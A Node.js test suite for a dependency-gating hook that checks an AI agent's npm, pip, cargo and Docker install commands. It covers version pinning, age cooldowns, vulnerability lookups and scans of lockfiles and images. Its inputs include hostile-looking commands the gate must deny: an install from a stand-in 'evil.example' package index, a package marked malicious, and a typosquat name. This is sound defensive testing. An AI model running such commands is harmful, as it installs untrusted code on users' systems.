'use strict';
const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { spawnSync } = require('node:child_process');
const { decide } = require('../dep-gate.js');
const { fakes, throwing } = require('./helpers/fakes.js');

const SCRIPT = path.join(__dirname, '..', 'dep-gate.js');
const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'secops-dep-'));
const bash = (command, cwd = tmp()) => ({ tool_name: 'Bash', tool_input: { command, description: 'd' }, cwd });

test('non-install command: null without touching deps', async () => {
  assert.strictEqual(await decide(bash('ls -la && git status'), throwing), null);
  assert.strictEqual(await decide(bash('echo "npm install x"'), throwing), null);
});

test('explicit install is pinned via updatedInput with the full tool_input', async () => {
  const { deps, calls } = fakes({ registry: { 'npm:lodash': '4.17.21' } });
  const r = await decide(bash('npm install lodash && npm test'), deps);
  assert.strictEqual(r.decision, 'allow');
  assert.deepStrictEqual(r.updatedInput, { command: 'npm install lodash@4.17.21 --save-exact && npm test', description: 'd' });
  assert.match(r.context, /pinned lodash -> lodash@4\.17\.21/);
  assert.deepStrictEqual(calls.resolve[0], { eco: 'npm', name: 'lodash', spec: '', days: 7 });
  assert.strictEqual(calls.osv[0][0].version, '4.17.21');
});

test('pip and cargo pins use their own syntax', async () => {
  const { deps } = fakes({ registry: { 'pypi:requests': '2.31.0', 'crates:serde': '1.0.190' } });
  const r = await decide(bash('pip install requests; cargo add serde'), deps);
  assert.strictEqual(r.updatedInput.command, 'pip install requests==2.31.0; cargo add serde@=1.0.190');
});

test('exact pin that already checks out: no output', async () => {
  const { deps } = fakes({ registry: { 'npm:lodash': '4.17.21' } });
  assert.strictEqual(await decide(bash('npm i lodash@4.17.21'), deps), null);
});

test('package not in registry: deny as possibly hallucinated', async () => {
  const { deps } = fakes();
  const r = await decide(bash('npm i reqeusts-pro'), deps);
  assert.strictEqual(r.decision, 'deny');
  assert.match(r.reason, /^secops-guard: npm package "reqeusts-pro" does not exist/);
  assert.match(r.reason, /hallucinated/);
});

test('invalid package name: says invalid, not hallucinated', async () => {
  const { deps } = fakes({ registry: { 'npm:bad..name': { error: 'not_found', detail: 'invalid package name "bad..name"' } } });
  const r = await decide(bash('npm i bad..name'), deps);
  assert.match(r.reason, /is not a valid npm package name/);
  assert.doesNotMatch(r.reason, /hallucinated/);
});

test('too new exact pin: deny naming the newest old-enough version', async () => {
  const { deps } = fakes({ registry: { 'npm:foo': { error: 'too_new', detail: { version: '2.0.0', suggestion: '1.9.0' } } } });
  const r = await decide(bash('npm i foo@2.0.0'), deps);
  assert.strictEqual(r.decision, 'deny');
  assert.match(r.reason, /less than 7 days/);
  assert.match(r.reason, /Use foo@1\.9\.0 instead/);
});

test('no_match: deny with detail', async () => {
  const { deps } = fakes({ registry: { 'pypi:x': { error: 'no_match', detail: 'every version of x matching ">=9" is younger than 7 days' } } });
  const r = await decide(bash('pip install "x>=9"'), deps);
  assert.match(r.reason, /younger than 7 days/);
});

test('vulnerable version: deny with ids and fixed version', async () => {
  const { deps } = fakes({
    registry: { 'pypi:requests': '2.19.0' },
    vulns: { 'pypi:requests@2.19.0': [{ id: 'GHSA-x84v', severity: 'MODERATE', fixed: '2.20.0' }] },
  });
  const r = await decide(bash('pip install requests==2.19.0'), deps);
  assert.strictEqual(r.decision, 'deny');
  assert.match(r.reason, /requests@2\.19\.0 has known vulnerabilities: GHSA-x84v \(MODERATE, fixed in 2\.20\.0\)/);
});

test('maxFixed picks the highest fixed version', () => {
  const { maxFixed } = require('../dep-gate.js');
  assert.strictEqual(maxFixed(['1.2.3', null, '1.2.10', '1.2.6']), '1.2.10');
  assert.strictEqual(maxFixed([null]), null);
});

test('malicious: deny loudly', async () => {
  const { deps } = fakes({ registry: { 'npm:evil': '1.0.0' }, vulns: { 'npm:evil@1.0.0': [{ id: 'MAL-2024-1', severity: 'MALICIOUS', fixed: null }] } });
  const r = await decide(bash('npx evil'), deps);
  assert.match(r.reason, /MALICIOUS/);
});

test('packageSeverityBlock threshold lets lower severities through', async () => {
  const { deps } = fakes({
    config: { packageSeverityBlock: 'HIGH' },
    registry: { 'npm:a': '1.0.0' },
    vulns: { 'npm:a@1.0.0': [{ id: 'GHSA-low', severity: 'LOW', fixed: null }] },
  });
  assert.strictEqual((await decide(bash('npm i a'), deps)).decision, 'allow');
});

test('allowlisted package: no cooldown, no OSV, still pinned', async () => {
  const { deps, calls } = fakes({ config: { allow: new Set(['npm:internal-lib']) }, registry: { 'npm:internal-lib': '0.1.0' } });
  const r = await decide(bash('npm i internal-lib'), deps);
  assert.strictEqual(r.updatedInput.command, 'npm i internal-lib@0.1.0 --save-exact');
  assert.strictEqual(calls.resolve[0].days, 0);
  assert.strictEqual(calls.osv.length, 0);
});

test('allowlisted but unknown to the registry: allowed without pin', async () => {
  const { deps } = fakes({ config: { allow: new Set(['npm:private-x']) } });
  assert.strictEqual(await decide(bash('npm i private-x'), deps), null);
});

test('network failure: deny "could not verify" unless failOpen', async () => {
  const boom = new Error('fetch failed');
  let { deps } = fakes({ registry: { 'npm:a': boom } });
  let r = await decide(bash('npm i a'), deps);
  assert.strictEqual(r.decision, 'deny');
  assert.match(r.reason, /could not verify npm:a \(fetch failed\)/);
  ({ deps } = fakes({ registry: { 'npm:a': '1.0.0' }, osvError: boom, config: { failOpen: true } }));
  r = await decide(bash('npm i a'), deps);
  assert.strictEqual(r.decision, 'allow');
  assert.match(r.context, /failOpen/);
});

test('multiple intents: every deny reason is listed', async () => {
  const { deps } = fakes({ registry: { 'npm:ok': '1.0.0' } });
  const r = await decide(bash('npm i ok nope1 && pip install nope2'), deps);
  assert.strictEqual(r.decision, 'deny');
  assert.match(r.reason, /nope1/);
  assert.match(r.reason, /nope2/);
  assert.ok(r.reason.split('\n').every((l) => l.startsWith('secops-guard:')));
});

test('custom index not in allowRegistries: deny', async () => {
  const { deps } = fakes({ registry: { 'pypi:foo': '1.0' } });
  const r = await decide(bash('pip install --index-url https://evil.example/simple foo'), deps);
  assert.match(r.reason, /evil\.example/);
  const ok = await decide(bash('pip install -i https://pypi.org/simple foo'), deps);
  assert.strictEqual(ok.decision, 'allow');
});

test('npx of a locally installed binary is not gated', async () => {
  const dir = tmp();
  fs.mkdirSync(path.join(dir, 'node_modules', '.bin'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'node_modules', '.bin', 'tsc'), '');
  const { deps, calls } = fakes();
  assert.strictEqual(await decide(bash('npx tsc --noEmit', dir), deps), null);
  assert.strictEqual(calls.resolve.length, 0);
});

test('nested string that cannot be rewritten: deny with the exact pin to use', async () => {
  const { deps } = fakes({ registry: { 'npm:foo': '1.2.3' } });
  const r = await decide(bash('bash -c "npm i \\"foo\\""'), deps);
  assert.strictEqual(r.decision, 'deny');
  assert.match(r.reason, /pinned as foo@1\.2\.3/);
});

test('lockfile install: HIGH vuln denies, cache keyed on sha256', async () => {
  const dir = tmp();
  fs.writeFileSync(path.join(dir, 'package-lock.json'), '{"lockfileVersion":3}');
  const { deps, calls } = fakes({
    lockfiles: { 'package-lock.json': [{ ecosystem: 'npm', name: 'minimist', version: '1.2.0' }] },
    vulns: { 'npm:minimist@1.2.0': [{ id: 'GHSA-vh95', severity: 'CRITICAL', fixed: '1.2.6' }] },
  });
  const r = await decide(bash('npm ci', dir), deps);
  assert.strictEqual(r.decision, 'deny');
  assert.match(r.reason, /package-lock\.json pins .*minimist@1\.2\.0: GHSA-vh95 \(CRITICAL, fixed in 1\.2\.6\)/);
  assert.match(calls.cached[0], /^lockscan:v1:HIGH:[0-9a-f]{64}$/);
});

test('lockfile install: low severity -> context only', async () => {
  const dir = tmp();
  fs.writeFileSync(path.join(dir, 'package-lock.json'), '{}');
  const { deps } = fakes({
    lockfiles: { 'package-lock.json': [{ ecosystem: 'npm', name: 'a', version: '1.0.0' }] },
    vulns: { 'npm:a@1.0.0': [{ id: 'GHSA-low', severity: 'LOW', fixed: null }] },
  });
  const r = await decide(bash('npm install', dir), deps);
  assert.strictEqual(r.decision, 'context');
  assert.match(r.context, /GHSA-low/);
});

test('lockfile install without a lockfile: context note', async () => {
  const { deps } = fakes();
  const r = await decide(bash('cd sub && pip install -r requirements.txt'), deps);
  assert.strictEqual(r.decision, 'context');
  assert.match(r.context, /no lockfile/);
});

test('unparseable lockfile: note, not deny', async () => {
  const dir = tmp();
  fs.writeFileSync(path.join(dir, 'package-lock.json'), '{');
  const { deps } = fakes({ lockfiles: { 'package-lock.json': new Error('Unexpected end of JSON') } });
  const r = await decide(bash('npm ci', dir), deps);
  assert.strictEqual(r.decision, 'context');
  assert.match(r.context, /could not parse/);
});

test('images: no scanner -> context; floating tag noted', async () => {
  const { deps } = fakes();
  const r = await decide(bash('docker run --rm nginx'), deps);
  assert.strictEqual(r.decision, 'context');
  assert.match(r.context, /floating tag/);
  assert.match(r.context, /install grype/);
});

test('images: HIGH vulns deny, allowlisted image skipped', async () => {
  const scanner = () => ({ scanner: 'grype', vulns: [{ id: 'CVE-1', severity: 'CRITICAL', pkg: 'openssl' }, { id: 'CVE-2', severity: 'LOW', pkg: 'x' }] });
  let { deps } = fakes({ scanner });
  const r = await decide(bash('docker pull redis:7.0.0'), deps);
  assert.strictEqual(r.decision, 'deny');
  assert.match(r.reason, /redis:7\.0\.0 has 1 vulnerabilities at or above HIGH \(grype\): CVE-1/);
  ({ deps } = fakes({ scanner, config: { allow: new Set(['image:redis:7.0.0']) } }));
  assert.strictEqual(await decide(bash('docker pull redis:7.0.0'), deps), null);
});

test('images: scanner failure denies unless failOpen', async () => {
  const { deps } = fakes({ scanner: new Error('timeout') });
  assert.strictEqual((await decide(bash('docker pull a:1'), deps)).decision, 'deny');
});

test('compose: images from compose file are scanned', async () => {
  const { deps, calls } = fakes({ images: ['postgres:16', 'redis:7'], scanner: () => ({ scanner: 'trivy', vulns: [] }) });
  assert.strictEqual(await decide(bash('docker compose up -d'), deps), null);
  assert.deepStrictEqual(calls.scan, ['postgres:16', 'redis:7']);
});

// ---------- spawned script: only the paths that need no network ----------
const run = (input, env = {}) => spawnSync(process.execPath, [SCRIPT], { input, encoding: 'utf8', env: { ...process.env, SECOPS_STATE_DIR: tmp(), ...env } });

test('spawn: non-install command -> no output, exit 0', () => {
  const r = run(JSON.stringify(bash('git status')));
  assert.strictEqual(r.status, 0);
  assert.strictEqual(r.stdout, '');
});

test('spawn: SECOPS_DISABLE=1 -> no output even for installs', () => {
  const r = run(JSON.stringify(bash('npm i lodash')), { SECOPS_DISABLE: '1' });
  assert.strictEqual(r.status, 0);
  assert.strictEqual(r.stdout, '');
});

test('spawn: malformed / other tools -> no output', () => {
  for (const input of ['', 'not json', 'null', JSON.stringify({ tool_name: 'Read', tool_input: { file_path: 'x' } })]) {
    const r = run(input);
    assert.strictEqual(r.status, 0);
    assert.strictEqual(r.stdout, '');
  }
});

test('fast path loads no network libs', () => {
  const probe = `require(${JSON.stringify(SCRIPT)}); const ks = Object.keys(require.cache).filter((k) => /registries|osv|lockfiles|cache\\.js|docker/.test(k)); process.stdout.write(JSON.stringify(ks));`;
  const r = spawnSync(process.execPath, ['-e', probe], { encoding: 'utf8' });
  assert.strictEqual(r.stdout, '[]');
});
